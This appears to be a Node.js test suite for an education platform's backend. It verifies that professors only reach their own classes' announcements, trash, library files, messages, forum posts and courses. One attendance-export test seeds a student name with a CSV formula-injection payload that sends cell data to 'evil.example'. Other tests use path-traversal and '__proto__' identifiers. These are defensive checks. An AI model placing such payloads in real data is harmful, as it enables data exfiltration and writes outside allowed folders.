// Revisão da integração (rodada 3): escopo do professor em avisos e na lixeira, regra
// única da biblioteca do aluno (listagem e download) e CSV de presença com a fórmula
// neutralizada. Cada teste falha no comportamento antigo.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const request = require('supertest');

const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'iclass-escopo-prof-test-'));
process.env.ICLASS_DATA_DIR = tempRoot;
process.env.ICLASS_CONTENT_DIR = path.join(tempRoot, 'content');
process.env.ICLASS_ARCHIVE_DIR = path.join(tempRoot, 'archives');
process.env.TEST_MODE = '1';

const db = require('../../backend/database.js');
const runtimePaths = require('../../backend/runtimePaths.js');
const fileStore = require('../../backend/utils/storage.js');
const { createApp } = require('../../backend/server.js');

let app;
const COURSE = 'curso-escopo';
const adminToken = 'admin-token-escopo';
const professorToken = 'professor-token-escopo';
const tokens = { ana: 'token-ana-escopo', zeca: 'token-zeca-escopo' };
const PDF = Buffer.from('%PDF-1.4\n%escopo\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n');

function seed() {
    db.memory.admins = [
        { email: 'admin@escopo.local', name: 'Admin', role: 'admin', password: db.hashPassword('x') },
        {
            email: 'prof@escopo.local', name: 'Professor', role: 'professor', password: db.hashPassword('x'),
            assignedClasses: [{ courseId: COURSE, className: '1DES' }],
            additionalPermissions: ['page.system', 'system.manage'],
        },
    ];
    db.memory.adminSessions = {
        [adminToken]: { email: 'admin@escopo.local', createdAt: Date.now(), lastSeen: Date.now() },
        [professorToken]: { email: 'prof@escopo.local', createdAt: Date.now(), lastSeen: Date.now() },
    };
    db.memory.courses = [{ id: COURSE, name: 'Curso', structure: [] }];
    db.memory.classes = [
        { name: '1DES', courseId: COURSE, period: 'Manhã', onlineExamConfigs: {} },
        { name: '2DES', courseId: COURSE, period: 'Tarde', onlineExamConfigs: {} },
    ];
    db.memory.students = [
        { name: 'Ana', email: 'ana@escopo.local', status: 'Ativo', password: db.hashPassword('123'), classes: [{ name: '1DES', courseId: COURSE }], studentClass: '1DES' },
        { name: 'Zeca Dois', email: 'zeca@escopo.local', status: 'Ativo', password: db.hashPassword('123'), classes: [{ name: '2DES', courseId: COURSE }], studentClass: '2DES' },
    ];
    db.memory.sessions = {};
    for (const [name, token] of Object.entries(tokens)) {
        db.memory.sessions[`${name}@escopo.local`] = { token, lastSeen: Date.now(), createdAt: Date.now(), ip: '::ffff:127.0.0.1' };
    }
    db.memory.announcements = [];
    db.memory.library = [];
    db.memory.attendance = [];
    db.memory.submissions = [];
    db.memory.auditLogs = [];
    db.memory.studentExamState = {};
    db.memory.examApplications = [];
    fs.rmSync(runtimePaths.TRASH_DIR, { recursive: true, force: true });
    fs.mkdirSync(runtimePaths.UPLOADS_DIR, { recursive: true });
}

const asAdmin = req => req.set('x-admin-session', adminToken);
const asProfessor = req => req.set('x-admin-session', professorToken);

test.before(async () => { await db.init(); app = createApp(); });
test.beforeEach(() => { seed(); });
test.after(async () => {
    await new Promise(resolve => setTimeout(resolve, 1500));
    await db.close();
    fs.rmSync(tempRoot, { recursive: true, force: true });
});

// ---------------------------------------------------------------- Avisos

test('[UC-ADMIN-001] aviso para toda a instituição: o professor lê, mas não edita, não redireciona e não exclui', async () => {
    const created = await asAdmin(request(app).post('/api/admin/announcements')).send({ title: 'Recado da direção', message: 'Reunião geral', target: 'todos' });
    assert.equal(created.status, 200, created.body.error);
    const id = created.body.announcement.id;

    const list = await asProfessor(request(app).get(`/api/admin/announcements?courseId=${COURSE}&studentClass=1DES`)).expect(200);
    const seen = list.body.find(item => item.id === id);
    assert.ok(seen, 'o professor continua vendo o aviso da direção');
    assert.equal(seen.canEdit, false);

    const hijack = await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Trocado pelo professor', message: 'x', target: 'turma', targetValue: '1DES', courseId: COURSE, studentClass: '1DES',
    });
    assert.equal(hijack.status, 403, 'antes: 200 e o aviso da direção virava aviso da turma do professor');
    const removed = await asProfessor(request(app).post('/api/admin/announcements/delete')).send({ id });
    assert.equal(removed.status, 403, 'antes: 200 com removed 1');
    const stored = db.memory.announcements.find(item => item.id === id);
    assert.deepEqual([stored.title, stored.target, stored.targetValue], ['Recado da direção', 'todos', '']);

    const adminList = await asAdmin(request(app).get('/api/admin/announcements')).expect(200);
    assert.equal(adminList.body.find(item => item.id === id).canEdit, true);
    await asAdmin(request(app).post('/api/admin/announcements/delete')).send({ id }).expect(200);
    assert.equal(db.memory.announcements.some(item => item.id === id), false);
});

test('[UC-ADMIN-001] professor edita e exclui o aviso da própria turma, sem levar o alvo para fora do escopo', async () => {
    const created = await asProfessor(request(app).post('/api/admin/announcements')).send({
        title: 'Prova remarcada', message: 'Sexta', target: 'turma', targetValue: '1DES', courseId: COURSE, studentClass: '1DES',
    });
    assert.equal(created.status, 200, created.body.error);
    const id = created.body.announcement.id;
    const list = await asProfessor(request(app).get(`/api/admin/announcements?courseId=${COURSE}&studentClass=1DES`)).expect(200);
    assert.equal(list.body.find(item => item.id === id).canEdit, true);

    await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Para todos', message: 'x', target: 'todos', courseId: COURSE, studentClass: '1DES',
    }).expect(403);
    await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Para a outra turma', message: 'x', target: 'turma', targetValue: '2DES', courseId: COURSE,
    }).expect(403);
    assert.equal(db.memory.announcements.find(item => item.id === id).targetValue, '1DES');

    const edited = await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Prova remarcada para segunda', message: 'Segunda', target: 'turma', targetValue: '1DES', courseId: COURSE, studentClass: '1DES',
    });
    assert.equal(edited.status, 200, edited.body.error);
    await asProfessor(request(app).post('/api/admin/announcements/delete')).send({ id }).expect(200);
    assert.equal(db.memory.announcements.length, 0);

    // Aviso da outra turma (do administrador): fora do escopo, nem aparece nem sai.
    const other = await asAdmin(request(app).post('/api/admin/announcements')).send({
        title: 'Só 2DES', message: 'x', target: 'turma', targetValue: '2DES', courseId: COURSE, studentClass: '2DES',
    });
    await asProfessor(request(app).post('/api/admin/announcements/delete')).send({ id: other.body.announcement.id }).expect(403);
    assert.equal(db.memory.announcements.length, 1);
});

// ---------------------------------------------------------------- Lixeira

test('[UC-BACKUP-001] lixeira do professor: pasta de aluno e atestado só para o administrador; material só da turma dele', async () => {
    // Atestado da aluna da outra turma e exclusão da aluna (a pasta vai para a lixeira).
    const upload = await asAdmin(request(app).post('/api/admin/attendance/justification-upload'))
        .field('studentEmail', 'zeca@escopo.local').field('courseId', COURSE).field('studentClass', '2DES').field('scope', 'class')
        .attach('file', PDF, { filename: 'atestado-medico-zeca.pdf', contentType: 'application/pdf' });
    assert.equal(upload.status, 200, upload.body.error);
    await asAdmin(request(app).post('/api/admin/delete-student')).send({ email: 'zeca@escopo.local' }).expect(200);

    // Material da biblioteca excluído em cada turma.
    for (const [id, studentClass, filename] of [['lib_1des', '1DES', 'material-1des.pdf'], ['lib_2des', '2DES', 'material-2des.pdf']]) {
        fs.writeFileSync(path.join(runtimePaths.UPLOADS_DIR, filename), PDF);
        db.memory.library.push({ id, kind: 'file', courseId: COURSE, studentClass, filename, url: `/uploads/${filename}`, name: filename });
        const deleted = await asAdmin(request(app).post('/api/admin/library/delete')).send({ id, courseId: COURSE, studentClass, scope: 'class' });
        assert.equal(deleted.status, 200, deleted.body.error);
    }

    const all = await asAdmin(request(app).get('/api/admin/trash')).expect(200);
    const folder = all.body.find(entry => /^alunos\//.test(entry.originalRel));
    assert.ok(folder, JSON.stringify(all.body));
    assert.equal(all.body.length, 3);

    const mine = await asProfessor(request(app).get('/api/admin/trash')).expect(200);
    assert.deepEqual(mine.body.map(entry => entry.name), ['material-1des.pdf'], 'antes o professor listava a pasta "alunos/Zeca Dois" com o atestado');
    await asProfessor(request(app).post('/api/admin/trash/delete')).send({ id: folder.id }).expect(403);
    await asProfessor(request(app).post('/api/admin/trash/restore')).send({ id: folder.id }).expect(403);
    const other = all.body.find(entry => entry.name === 'material-2des.pdf');
    await asProfessor(request(app).post('/api/admin/trash/restore')).send({ id: other.id }).expect(403);
    await asProfessor(request(app).post('/api/admin/trash/empty')).send({}).expect(200);

    const after = await asAdmin(request(app).get('/api/admin/trash')).expect(200);
    assert.deepEqual(after.body.map(entry => entry.name).sort(), ['Zeca Dois', 'material-2des.pdf'], 'o atestado não se perde');
    assert.ok(fs.existsSync(path.join(fileStore.LIXEIRA_DIR, folder.id, 'atestados')));
    await asAdmin(request(app).post('/api/admin/trash/restore')).send({ id: folder.id }).expect(200);
});

test('[UC-BACKUP-001] item antigo da lixeira sem curso nem autor fica com o administrador', async () => {
    const loose = path.join(runtimePaths.UPLOADS_DIR, 'arquivo-antigo.pdf');
    fs.writeFileSync(loose, PDF);
    const id = fileStore.moveToTrash(loose);
    assert.ok(id);
    const mine = await asProfessor(request(app).get('/api/admin/trash')).expect(200);
    assert.equal(mine.body.length, 0);
    await asProfessor(request(app).post('/api/admin/trash/delete')).send({ id }).expect(403);
    const all = await asAdmin(request(app).get('/api/admin/trash')).expect(200);
    assert.equal(all.body.length, 1);
});

// ---------------------------------------------------------------- Biblioteca

test('[UC-SIGILO-001] biblioteca do aluno: download segue a regra da listagem (turma do item e itens ocultos)', async () => {
    const files = ['so-1des.pdf', 'oculto-2des.pdf', 'curso.pdf'];
    files.forEach(name => fs.writeFileSync(path.join(runtimePaths.UPLOADS_DIR, name), PDF));
    db.memory.library = [
        { id: 'lib_class', kind: 'file', courseId: COURSE, studentClass: '1DES', filename: 'so-1des.pdf', url: '/uploads/so-1des.pdf', name: 'Material só 1DES' },
        { id: 'lib_course_hidden', kind: 'file', courseId: COURSE, studentClass: '', filename: 'oculto-2des.pdf', url: '/uploads/oculto-2des.pdf', name: 'Oculto na 2DES' },
        { id: 'lib_hidden_x', courseId: COURSE, studentClass: '2DES', sourceLibraryId: 'lib_course_hidden', hidden: true },
        { id: 'lib_course', kind: 'file', courseId: COURSE, studentClass: '', filename: 'curso.pdf', url: '/uploads/curso.pdf', name: 'Do curso' },
    ];

    const listZeca = await request(app).get(`/api/student/library?courseId=${COURSE}&studentClass=2DES`).set('x-session-token', tokens.zeca).expect(200);
    assert.deepEqual(listZeca.body.map(item => item.name), ['Do curso']);
    await request(app).get('/uploads/so-1des.pdf').set('x-session-token', tokens.zeca).expect(403);
    await request(app).get('/uploads/oculto-2des.pdf').set('x-session-token', tokens.zeca).expect(403);
    await request(app).get('/uploads/curso.pdf').set('x-session-token', tokens.zeca).expect(200);

    const listAna = await request(app).get(`/api/student/library?courseId=${COURSE}&studentClass=1DES`).set('x-session-token', tokens.ana).expect(200);
    assert.deepEqual(listAna.body.map(item => item.name).sort(), ['Do curso', 'Material só 1DES', 'Oculto na 2DES']);
    for (const name of files) await request(app).get(`/uploads/${name}`).set('x-session-token', tokens.ana).expect(200);
    // Professor e administrador continuam baixando.
    await asProfessor(request(app).get('/uploads/oculto-2des.pdf')).expect(200);
});

// ---------------------------------------------------------------- CSV de presença

test('[UC-PRESENCA-002] CSV de presença neutraliza fórmula no nome do aluno, como a exportação de notas', async () => {
    db.memory.students[0].name = '=HYPERLINK("http://evil.example/?x="&A1;"Clique")';
    db.memory.attendance = [{
        id: 'att_1', studentEmail: 'ana@escopo.local', studentClass: '1DES', courseId: COURSE, date: '2026-10-15', origin: 'chamada',
        aulas: [{ ordem: 1, disciplinaId: '', inicio: '07:30', status: 'presente', hora: '' }], timestamp: Date.now(),
    }];
    const csv = await asAdmin(request(app).get(`/api/admin/attendance/export?courseId=${COURSE}&studentClass=1DES`)).expect(200);
    assert.ok(csv.text.startsWith('﻿'), 'BOM para os acentos no Excel');
    const line = csv.text.split('\r\n').find(row => row.includes('ana@escopo.local'));
    assert.ok(line, csv.text);
    assert.match(line, /^2026-10-15;"'=HYPERLINK\(""http:\/\/evil\.example\/\?x=""&A1;""Clique""\)";ana@escopo\.local;/);
    // Nenhum campo começa com um caractere de fórmula.
    assert.doesNotMatch(csv.text, /(^|;)"?[=+@]/m);
});

// ---------------------------------------------------------------- Mensagens do Monitor (fase 2, H5c)

function seedMessages() {
    const base = { acknowledgedBy: [], deletedFor: [], adminDeleted: false, status: 'pending', examKey: null, applicationId: null };
    db.memory.broadcastMessages = [
        { ...base, id: 'msg-1des', studentClass: '1DES', courseId: COURSE, targetEmail: null, messageText: 'Para a 1DES', timestamp: 4 },
        { ...base, id: 'msg-2des-privada', studentClass: '2DES', courseId: COURSE, targetEmail: 'zeca@escopo.local', messageText: 'Só para o Zeca', timestamp: 3 },
        // Mensagens antigas, sem curso: valem pela turma (nome único).
        { ...base, id: 'msg-2des-antiga', studentClass: '2DES', courseId: null, targetEmail: null, messageText: 'Antiga da 2DES', timestamp: 2 },
        { ...base, id: 'msg-1des-antiga', studentClass: '1DES', courseId: null, targetEmail: null, messageText: 'Antiga da 1DES', timestamp: 1 },
    ];
}

test('[UC-ADMIN-003] histórico de mensagens do Monitor: o professor só vê as mensagens das turmas dele (SEG-11)', async () => {
    seedMessages();
    const mine = await asProfessor(request(app).get('/api/admin/message-history')).expect(200);
    assert.deepEqual(mine.body.messages.map(m => m.id), ['msg-1des', 'msg-1des-antiga'],
        'antes o professor da 1DES recebia a mensagem privada para o aluno da 2DES');
    const filtered = await asProfessor(request(app).get(`/api/admin/message-history?studentClass=1DES&courseId=${COURSE}`)).expect(200);
    assert.deepEqual(filtered.body.messages.map(m => m.id), ['msg-1des', 'msg-1des-antiga']);
    await asProfessor(request(app).get(`/api/admin/message-history?studentClass=2DES&courseId=${COURSE}`)).expect(403);
    const all = await asAdmin(request(app).get('/api/admin/message-history')).expect(200);
    assert.equal(all.body.messages.length, 4, 'o administrador continua vendo todas');
});

test('[UC-ADMIN-003] apagar do histórico exige a mensagem ou a turma, e o professor não apaga mensagem de outra turma (SEG-11)', async () => {
    seedMessages();
    const deleted = () => db.memory.broadcastMessages.filter(m => m.adminDeleted).map(m => m.id).sort();

    const empty = await asProfessor(request(app).post('/api/admin/message-history/delete')).send({});
    assert.equal(empty.status, 400, 'antes o corpo vazio apagava as mensagens de todas as turmas');
    assert.equal(empty.body.error, 'Informe a mensagem ou a turma.');
    await asAdmin(request(app).post('/api/admin/message-history/delete')).send({}).expect(400);
    await asAdmin(request(app).post('/api/admin/message-history/delete')).send({ messageId: 123, studentClass: ['2DES'] }).expect(400);
    assert.deepEqual(deleted(), []);

    const foreign = await asProfessor(request(app).post('/api/admin/message-history/delete')).send({ messageId: 'msg-2des-privada' });
    assert.equal(foreign.status, 403);
    assert.equal(foreign.body.error, 'Você não tem acesso a esta mensagem.');
    await asProfessor(request(app).post('/api/admin/message-history/delete')).send({ messageId: 'msg-2des-antiga', studentClass: '1DES', courseId: COURSE }).expect(403);
    await asProfessor(request(app).post('/api/admin/message-history/delete')).send({ studentClass: '2DES', courseId: COURSE }).expect(403);
    assert.deepEqual(deleted(), []);

    // A tela do Monitor manda a mensagem e a turma ativa juntas.
    const own = await asProfessor(request(app).post('/api/admin/message-history/delete')).send({ messageId: 'msg-1des', studentClass: '1DES', courseId: COURSE });
    assert.equal(own.status, 200, own.body.error);
    assert.equal(own.body.deleted, 1);
    // "Limpar histórico" da turma: só as da turma pedida.
    const clearOwn = await asProfessor(request(app).post('/api/admin/message-history/delete')).send({ studentClass: '1DES', courseId: COURSE });
    assert.equal(clearOwn.body.deleted, 1);
    assert.deepEqual(deleted(), ['msg-1des', 'msg-1des-antiga']);

    const adminClear = await asAdmin(request(app).post('/api/admin/message-history/delete')).send({ studentClass: '2DES' }).expect(200);
    assert.equal(adminClear.body.deleted, 2);
    assert.equal(deleted().length, 4);
});

// ---------------------------------------------------------------- Fórum (fase 2, H5c)

function seedForum() {
    db.memory.forum = [
        { id: 'duvida-1des', key: 'geral', studentEmail: 'ana@escopo.local', studentName: 'Ana', courseId: COURSE, studentClass: '1DES', text: 'Dúvida da 1DES', timestamp: '2026-10-01T10:00:00Z', replies: [] },
        { id: 'duvida-2des', key: 'geral', studentEmail: 'zeca@escopo.local', studentName: 'Zeca Dois', courseId: COURSE, studentClass: '2DES', text: 'Dúvida da 2DES', timestamp: '2026-10-02T10:00:00Z', replies: [] },
        // Antiga, sem turma: a turma sai do cadastro do aluno (2DES).
        { id: 'duvida-2des-antiga', key: 'geral', studentEmail: 'zeca@escopo.local', studentName: 'Zeca Dois', text: 'Antiga da 2DES', timestamp: '2026-09-01T10:00:00Z', replies: [] },
        // Antiga de quem não está mais no cadastro: não dá para saber a turma.
        { id: 'duvida-sem-turma', key: 'geral', studentEmail: 'saiu@escopo.local', studentName: 'Ex-aluno', text: 'Sem turma', timestamp: '2026-08-01T10:00:00Z', replies: [] },
    ];
}

test('[UC-ADMIN-003] fórum do painel: o professor só recebe as dúvidas das turmas dele, e dúvida sem turma fica com o administrador (SEG-11)', async () => {
    seedForum();
    const mine = await asProfessor(request(app).post('/api/admin/forum/all')).send({}).expect(200);
    assert.deepEqual(mine.body.comments.map(c => c.id), ['duvida-1des'],
        'antes vinham as dúvidas (com o e-mail do aluno) de todas as turmas do curso');
    const scoped = await asProfessor(request(app).post('/api/admin/forum/all')).send({ courseId: COURSE, studentClass: '1DES' }).expect(200);
    assert.deepEqual(scoped.body.comments.map(c => c.id), ['duvida-1des']);
    await asProfessor(request(app).post('/api/admin/forum/all')).send({ courseId: COURSE, studentClass: '2DES' }).expect(403);

    const viaForum = await asProfessor(request(app).get('/api/forum?key=geral')).expect(200);
    assert.deepEqual(viaForum.body.comments.map(c => c.id), ['duvida-1des']);

    const all = await asAdmin(request(app).post('/api/admin/forum/all')).send({}).expect(200);
    assert.deepEqual(all.body.comments.map(c => c.id).sort(), ['duvida-1des', 'duvida-2des', 'duvida-2des-antiga', 'duvida-sem-turma']);
    const adminForum = await asAdmin(request(app).get('/api/forum?key=geral')).expect(200);
    assert.equal(adminForum.body.comments.length, 4);
    // A dúvida antiga ganhou a turma inferida (gravada para as próximas leituras).
    assert.deepEqual([db.memory.forum[2].courseId, db.memory.forum[2].studentClass], [COURSE, '2DES']);
});

test('[UC-ADMIN-003] fórum do aluno: sem curso e turma a lista é recusada, e com a turma dele vêm só as dúvidas dela (SEG-11)', async () => {
    seedForum();
    const noContext = await request(app).get('/api/forum?key=geral').set('x-session-token', tokens.ana);
    assert.equal(noContext.status, 400, 'antes a aluna da 1DES lia as dúvidas e os nomes da 2DES');
    assert.equal(noContext.body.error, 'Informe o curso e a turma.');
    await request(app).get(`/api/forum?key=geral&courseId=${COURSE}`).set('x-session-token', tokens.ana).expect(400);
    await request(app).get(`/api/forum?key=geral&courseId=${COURSE}&studentClass=2DES`).set('x-session-token', tokens.ana).expect(403);
    const own = await request(app).get(`/api/forum?key=geral&courseId=${COURSE}&studentClass=1DES`).set('x-session-token', tokens.ana).expect(200);
    assert.deepEqual(own.body.comments.map(c => c.id), ['duvida-1des']);
});

// ---------------------------------------------------------------- Cursos (fase 2, H5c)

const OTHER_COURSE = 'curso-outra-escola';

function seedCourses({ professorSchools = [] } = {}) {
    db.memory.schools = [
        { id: 'escola-a', name: 'Escola A', info: {}, branding: {} },
        { id: 'escola-b', name: 'Escola B', info: {}, branding: {} },
    ];
    db.memory.courses = [
        { id: COURSE, name: 'Curso', description: 'Do professor', schoolId: 'escola-a', structure: [{ id: 'm1', title: 'Módulo 1', units: [] }], status: 'active' },
        { id: OTHER_COURSE, name: 'Curso de outra coordenação', schoolId: 'escola-b', structure: [], status: 'active' },
    ];
    const professor = db.memory.admins.find(account => account.role === 'professor');
    professor.additionalPermissions = ['course.manage'];
    professor.assignedSchoolIds = professorSchools;
}

const courseById = id => db.memory.courses.find(course => course.id === id);
const courseAudit = action => (db.memory.auditLogs || []).filter(entry => entry.action === action);

test('[UC-ADMIN-003] professor com course.manage não altera, não exclui, não duplica nem lista curso fora do escopo (SEG-12)', async () => {
    seedCourses();
    const put = await asProfessor(request(app).put(`/api/admin/courses/${OTHER_COURSE}`)).send({ name: 'ALTERADO PELO PROFESSOR' });
    assert.equal(put.status, 403);
    await asProfessor(request(app).delete(`/api/admin/courses/${OTHER_COURSE}`)).expect(403);
    await asProfessor(request(app).post(`/api/admin/courses/${OTHER_COURSE}/clone`)).send({ newId: 'COPIA_OUTRA', newName: 'Cópia' }).expect(403);
    const other = courseById(OTHER_COURSE);
    assert.equal(other.name, 'Curso de outra coordenação');
    assert.equal(other.deleted, undefined);
    assert.equal(courseById('COPIA_OUTRA'), undefined);

    const list = await asProfessor(request(app).get('/api/courses?includeDeleted=1')).expect(200);
    assert.deepEqual(list.body.map(course => course.id), [COURSE], 'antes o professor recebia todos os cursos');
    const adminList = await asAdmin(request(app).get('/api/courses')).expect(200);
    assert.equal(adminList.body.length, 2);
});

test('[UC-CURSO-001] as rotas antigas de escrita de curso respondem 410 pedindo para recarregar, sem gravar nada (SEG-12)', async () => {
    seedCourses();
    for (const [method, url, body] of [
        ['put', `/api/courses/${OTHER_COURSE}`, { name: 'ALTERADO PELO PROFESSOR', schoolId: 'x', structure: [] }],
        ['delete', `/api/courses/${OTHER_COURSE}`, undefined],
        ['post', '/api/courses', { id: 'NOVO_ANTIGO', name: 'Pela rota antiga' }],
    ]) {
        for (const as of [asProfessor, asAdmin]) {
            let req = as(request(app)[method](url));
            if (body) req = req.send(body);
            const res = await req;
            assert.equal(res.status, 410, `${method.toUpperCase()} ${url}: antes 200`);
            assert.equal(res.body.error, 'O IClass foi atualizado. Recarregue a página (F5) para continuar.');
        }
    }
    assert.equal(courseById(OTHER_COURSE).name, 'Curso de outra coordenação');
    assert.equal(courseById(OTHER_COURSE).schoolId, 'escola-b');
    assert.equal(courseById('NOVO_ANTIGO'), undefined);
});

test('[UC-CURSO-001] alterar curso grava só os campos permitidos, a escola só o administrador muda, e cada mudança fica na auditoria (SEG-12)', async () => {
    seedCourses();
    // Trocar a escola: só o administrador. Nada é gravado com a recusa.
    const moveSchool = await asProfessor(request(app).put(`/api/admin/courses/${COURSE}`)).send({ name: 'Outro nome', schoolId: 'escola-b' });
    assert.equal(moveSchool.status, 403);
    assert.equal(moveSchool.body.error, 'Só o administrador pode mudar a escola do curso.');
    assert.equal(courseById(COURSE).name, 'Curso');

    // A tela manda a escola atual junto: não é mudança. structure e foo são ignorados.
    const edit = await asProfessor(request(app).put(`/api/admin/courses/${COURSE}`)).send({
        name: '  Curso renomeado  ', description: 'Nova descrição', schoolId: 'escola-a', structure: [], foo: 'bar', id: 'trocado', clonedFrom: 'x',
    });
    assert.equal(edit.status, 200, edit.body.error);
    const course = courseById(COURSE);
    assert.equal(course.name, 'Curso renomeado');
    assert.equal(course.description, 'Nova descrição');
    assert.equal(course.schoolId, 'escola-a');
    assert.equal(course.structure.length, 1, 'a estrutura só muda pela rota /structure');
    assert.equal(course.foo, undefined);
    assert.equal(course.clonedFrom, undefined);
    assert.equal(courseById('trocado'), undefined);

    const [updated] = courseAudit('course_updated');
    assert.ok(updated, 'antes a alteração de curso não ia para a auditoria');
    assert.equal(updated.category, 'academic');
    assert.equal(updated.actor, 'prof@escopo.local');
    assert.equal(updated.courseId, COURSE);
    assert.deepEqual([updated.before.name, updated.after.name], ['Curso', 'Curso renomeado']);
    assert.equal(updated.after.structure, undefined);

    // Salvar de novo sem mudar nada não registra.
    await asProfessor(request(app).put(`/api/admin/courses/${COURSE}`)).send({ name: 'Curso renomeado', schoolId: 'escola-a' }).expect(200);
    assert.equal(courseAudit('course_updated').length, 1);

    // Validação dos campos.
    for (const [body, field] of [[{ name: '' }, 'name'], [{ name: 'x'.repeat(121) }, 'name'], [{ name: 123 }, 'name'],
        [{ description: 'x'.repeat(2001) }, 'description'], [{ branding: 'azul' }, 'branding']]) {
        const res = await asAdmin(request(app).put(`/api/admin/courses/${COURSE}`)).send(body);
        assert.equal(res.status, 400, JSON.stringify(body));
        assert.equal(res.body.field, field);
    }
    await asAdmin(request(app).put(`/api/admin/courses/${COURSE}`)).send({ schoolId: 'escola-inexistente' }).expect(400);
    await asAdmin(request(app).put('/api/admin/courses/nao-existe')).send({ name: 'x' }).expect(404);

    // O administrador muda a escola.
    await asAdmin(request(app).put(`/api/admin/courses/${COURSE}`)).send({ schoolId: 'escola-b' }).expect(200);
    assert.equal(courseById(COURSE).schoolId, 'escola-b');
    const moved = courseAudit('course_updated').pop();
    assert.deepEqual([moved.before.schoolId, moved.after.schoolId, moved.actor], ['escola-a', 'escola-b', 'admin@escopo.local']);
});

test('[UC-CURSO-001] criar, excluir e restaurar curso pelo painel: campos permitidos, escola do professor e auditoria (SEG-12)', async () => {
    seedCourses();
    const created = await asAdmin(request(app).post('/api/admin/courses')).send({
        id: 'NOVO', name: 'Curso novo', description: 'Descrição', schoolId: 'escola-a',
        structure: [{ id: 'm1', units: [] }], status: 'deleted', deleted: true, extra: 1,
    });
    assert.equal(created.status, 200, created.body.error);
    const course = courseById('NOVO');
    assert.deepEqual(course.structure, [], 'a estrutura começa sempre vazia');
    assert.equal(course.status, 'active');
    assert.equal(course.deleted, false);
    assert.equal(course.extra, undefined);
    const [createdEntry] = courseAudit('course_created');
    assert.deepEqual([createdEntry.courseId, createdEntry.after.name, createdEntry.actor], ['NOVO', 'Curso novo', 'admin@escopo.local']);

    const duplicate = await asAdmin(request(app).post('/api/admin/courses')).send({ id: 'NOVO', name: 'De novo', schoolId: 'escola-a' });
    assert.equal(duplicate.status, 400);
    for (const id of ['../fora', 'com espaço', '__proto__', '', 'x'.repeat(65)]) {
        const res = await asAdmin(request(app).post('/api/admin/courses')).send({ id, name: 'Inválido', schoolId: 'escola-a' });
        assert.equal(res.status, 400, `id ${JSON.stringify(id)}`);
        assert.equal(res.body.field, 'id');
    }
    await asAdmin(request(app).post('/api/admin/courses')).send({ id: 'SEM_ESCOLA_VALIDA', name: 'x', schoolId: 'escola-z' }).expect(400);

    // Professor: só numa escola atribuída a ele.
    const noSchool = await asProfessor(request(app).post('/api/admin/courses')).send({ id: 'DO_PROF', name: 'Do professor', schoolId: 'escola-a' });
    assert.equal(noSchool.status, 403);
    assert.equal(courseById('DO_PROF'), undefined);
    db.memory.admins.find(account => account.role === 'professor').assignedSchoolIds = ['escola-a'];
    await asProfessor(request(app).post('/api/admin/courses')).send({ id: 'DO_PROF', name: 'Do professor', schoolId: 'escola-b' }).expect(403);
    await asProfessor(request(app).post('/api/admin/courses')).send({ id: 'DO_PROF', name: 'Do professor', schoolId: 'escola-a' }).expect(200);

    // Excluir marca e preserva; excluir de novo não muda nada nem registra.
    const removed = await asAdmin(request(app).delete('/api/admin/courses/NOVO')).expect(200);
    assert.equal(removed.body.course.deleted, true);
    const deletedAt = courseById('NOVO').deletedAt;
    assert.ok(deletedAt);
    await asAdmin(request(app).delete('/api/admin/courses/NOVO')).expect(200);
    assert.equal(courseById('NOVO').deletedAt, deletedAt);
    const deletedEntries = courseAudit('course_deleted');
    assert.equal(deletedEntries.length, 1, 'antes a exclusão de curso não ia para a auditoria');
    assert.deepEqual([deletedEntries[0].before.deleted, deletedEntries[0].after.deleted], [false, true]);

    // Restaurar (botão "Restaurar" em Cursos e turmas).
    await asAdmin(request(app).put('/api/admin/courses/NOVO')).send({ status: 'active', deleted: false, deletedAt: null }).expect(200);
    assert.deepEqual([courseById('NOVO').status, courseById('NOVO').deleted, courseById('NOVO').deletedAt], ['active', false, null]);
    const restored = courseAudit('course_updated').pop();
    assert.deepEqual([restored.before.deleted, restored.after.deleted], [true, false]);
});

test('[UC-CURSO-001] duplicar curso: código seguro e escola de destino dentro do escopo do professor (SEG-12)', async () => {
    seedCourses();
    // Código com '../' gravava os arquivos do conteúdo copiado fora da pasta de conteúdo.
    const traversal = await asAdmin(request(app).post(`/api/admin/courses/${COURSE}/clone`)).send({ newId: '../../fora', newName: 'Cópia' });
    assert.equal(traversal.status, 400);
    assert.equal(traversal.body.field, 'newId');
    await asAdmin(request(app).post(`/api/admin/courses/${COURSE}/clone`)).send({ newId: { x: 1 }, newName: 'Cópia' }).expect(400);

    await asProfessor(request(app).post(`/api/admin/courses/${COURSE}/clone`)).send({ newId: 'COPIA_B', newName: 'Cópia', schoolId: 'escola-b' }).expect(403);
    assert.equal(courseById('COPIA_B'), undefined);
    const ok = await asProfessor(request(app).post(`/api/admin/courses/${COURSE}/clone`)).send({ newId: 'copia_a', newName: 'Cópia', schoolId: 'escola-a' });
    assert.equal(ok.status, 200, ok.body.error);
    assert.equal(courseById('COPIA_A').schoolId, 'escola-a');
    const [cloned] = courseAudit('course_cloned');
    assert.deepEqual([cloned.courseId, cloned.after.newCourseId, cloned.after.schoolId], [COURSE, 'COPIA_A', 'escola-a']);
});

test('[UC-CURSO-001] as telas não chamam mais as rotas antigas de escrita de curso (SEG-12)', () => {
    const webSrc = path.join(__dirname, '..', '..', 'web', 'src');
    const walk = directory => fs.readdirSync(directory, { withFileTypes: true }).flatMap(entry => {
        const full = path.join(directory, entry.name);
        if (entry.isDirectory()) return walk(full);
        return /\.(jsx?|mjs)$/.test(entry.name) && !/\.test\./.test(entry.name) ? [full] : [];
    });
    const legacy = /api\.(post|put|delete)\(\s*[`'"]\/api\/courses/;
    const offenders = walk(webSrc).filter(file => legacy.test(fs.readFileSync(file, 'utf8')))
        .map(file => path.relative(webSrc, file));
    assert.deepEqual(offenders, []);
});
